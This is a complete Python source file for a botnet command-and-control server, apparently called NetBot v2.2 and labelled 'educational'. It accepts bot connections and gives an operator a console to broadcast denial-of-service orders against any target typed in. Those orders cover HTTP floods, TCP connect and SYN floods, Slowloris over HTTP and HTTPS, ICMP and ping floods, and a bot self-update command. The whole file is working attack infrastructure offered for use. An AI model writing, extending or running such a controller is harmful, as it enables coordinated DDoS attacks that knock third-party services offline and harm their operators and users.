#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author: Ahmad Mohammadi
# Tool  : NetBot v2.2 C2 Server
# Description: Educational Command & Control Center

import socket
import threading
import sys
import time
from termcolor import colored

# ====================== Global Variables ======================

bots = []  # List to keep track of connected bots
bots_lock = threading.Lock()  # Lock to prevent race conditions
current_command = "HOLD"  # Default command

# ====================== Helper Functions ======================

def log_info(msg):
    print(colored(f"[*] {msg}", "cyan"))

def log_success(msg):
    print(colored(f"[+] {msg}", "green"))

def log_warning(msg):
    print(colored(f"[!] {msg}", "red"))

def broadcast_command():
    global bots
    global current_command
    with bots_lock:
        for bot in bots:
            try:
                bot.send(current_command.encode())
            except Exception as e:
                log_warning(f"Failed to send command to a bot: {e}")

def handle_bot(conn, addr):
    global bots
    global current_command

    log_success(f"Bot connected: {addr[0]}:{addr[1]}")
    with bots_lock:
        bots.append(conn)

    try:
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    break
                conn.send(current_command.encode())
            except:
                break
    finally:
        with bots_lock:
            bots.remove(conn)
        conn.close()
        log_warning(f"Bot disconnected: {addr[0]}:{addr[1]}")

def accept_bots(server_socket):
    while True:
        try:
            conn, addr = server_socket.accept()
            conn.setblocking(True)
            threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()
        except Exception as e:
            log_warning(f"Accept error: {e}")

def admin_panel():
    global current_command

    log_info("Admin Panel started. Available commands:")
    print(colored("""
[ Commands ]
launch_httpflood           -> Launch HTTP flood attack (GET/POST/Random headers, Keep-Alive, SSL supported)
launch_tcpconnect          -> Launch normal TCP connect flood (port 80/any)
launch_tcpconnecthttps     -> Launch SSL-wrapped TCP connect flood (HTTPS, port 443)
launch_pingflood           -> Launch simple system ping flood (slow, basic)
launch_icmpflood           -> Launch raw ICMP packet flood (low-level, fast)
launch_slowloris           -> Launch slow HTTP headers flood (Slowloris, port 80)
launch_slowlorishttps      -> Launch slow HTTPS headers flood (Slowloris over SSL, port 443)
launch_tcpsynflood         -> Launch stealth TCP SYN flood (Layer 4 attack with randomization)
halt                       -> Stop all ongoing attacks
hold                       -> Make bots idle (waiting state)
update                     -> Instruct bots to self-update from server
exit                       -> Shut down the C2 server cleanly
""", "yellow"))


    while True:
        cmd = input(colored("C2 > ", "blue")).strip().lower()

        if cmd == "launch_httpflood":
            target = input("Target IP/Domain: ").strip()
            port = input("Target Port: ").strip()
            threads = input("Threads per bot: ").strip()
            current_command = f"{target}_{port}_LAUNCH_HTTPFLOOD_{threads}"
            broadcast_command()
            log_info(f"Launching HTTP Flood on {target}:{port} with {threads} threads per bot.")
        
        elif cmd == "launch_tcpsynflood":
            target = input("Target IP/Domain: ").strip()
            port = input("Target Port (default 80): ").strip()
            pps = input("Packets per second per bot (default 100): ").strip()

            if not port.isdigit():
                port = "80"
            if not pps.isdigit():
                pps = "100"

            current_command = f"{target}_{port}_LAUNCH_TCPSYNFLOOD_{pps}"
            broadcast_command()
            log_info(f"Launching TCP SYN Flood on {target}:{port} at {pps} PPS per bot.")

        elif cmd == "launch_tcpconnecthttps":
            target = input("Target IP/Domain: ").strip()
            port = input("Target Port (default 443): ").strip()
            threads = input("Threads per bot (default 20): ").strip()

            if not port.isdigit():
                port = "443"
            if not threads.isdigit():
                threads = "20"

            current_command = f"{target}_{port}_LAUNCH_TCPCONNECTFLOODHTTPS_{threads}"
            broadcast_command()
            log_info(f"Launching HTTPS TCP Connect Flood on {target}:{port} with {threads} threads per bot.")

        elif cmd == "launch_slowloris":
            target = input("Target IP/Domain: ").strip()
            port = input("Target Port (default 80): ").strip()
            sockets = input("Number of sockets per bot (default 100): ").strip()

            if not port.isdigit():
                port = "80"
            if not sockets.isdigit():
                sockets = "100"

            current_command = f"{target}_{port}_LAUNCH_SLOWLORIS_{sockets}"
            broadcast_command()
            log_info(f"Launching Slowloris on {target}:{port} with {sockets} sockets per bot.")

        elif cmd == "launch_slowlorishttps":
            target = input("Target IP/Domain: ").strip()
            port = input("Target Port (default 443): ").strip()
            sockets = input("Number of sockets per bot (default 100): ").strip()

            if not port.isdigit():
                port = "443"
            if not sockets.isdigit():
                sockets = "100"

            current_command = f"{target}_{port}_LAUNCH_SLOWLORISHTTPS_{sockets}"
            broadcast_command()
            log_info(f"Launching HTTPS Slowloris on {target}:{port} with {sockets} sockets per bot.")

        elif cmd == "launch_pingflood":
            target = input("Target IP/Domain: ").strip()
            current_command = f"{target}_0_LAUNCH_PINGFLOOD_0"
            broadcast_command()
            log_info(f"Launching Ping Flood on {target}.")

        elif cmd == "launch_tcpconnect":
            target = input("Target IP/Domain: ").strip()
            port = input("Target Port: ").strip()
            threads = input("Threads per bot: ").strip()
            current_command = f"{target}_{port}_LAUNCH_TCPCONNECTFLOOD_{threads}"
            broadcast_command()
            log_info(f"Launching TCP Connect Flood on {target}:{port} with {threads} threads per bot.")

        elif cmd == "launch_icmpflood":
            target = input("Target IP/Domain: ").strip()
            pps = input("Packets per second per bot (default 100): ").strip()
            if not pps.isdigit():
                pps = "100"
            current_command = f"{target}_0_LAUNCH_ICMPFLOOD_{pps}"
            broadcast_command()
            log_info(f"Launching ICMP Flood on {target} at {pps} pps per bot.")

        elif cmd == "halt":
            current_command = "0_0_HALT_0"
            broadcast_command()
            log_info("Halting all attacks.")

        elif cmd == "hold":
            current_command = "0_0_HOLD_0"
            broadcast_command()
            log_info("Holding all bots.")

        elif cmd == "update":
            current_command = "0_0_UPDATE_0"
            broadcast_command()
            log_info("Instructing bots to update.")

        elif cmd == "exit":
            log_warning("Shutting down C2 server...")
            with bots_lock:
                for bot in bots:
                    try:
                        bot.close()
                    except:
                        pass
                bots.clear()
            sys.exit(0)

        else:
            log_warning("Unknown command!")

# ====================== Main Function ======================

def main():
    host = "0.0.0.0"
    port = 5555

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((host, port))
        server_socket.listen(50)
        log_success(f"C2 server listening on {host}:{port}")
    except Exception as e:
        log_warning(f"Failed to bind server: {e}")
        sys.exit(1)

    threading.Thread(target=accept_bots, args=(server_socket,), daemon=True).start()
    admin_panel()

# ====================== Start Server ======================

if __name__ == "__main__":
    main()
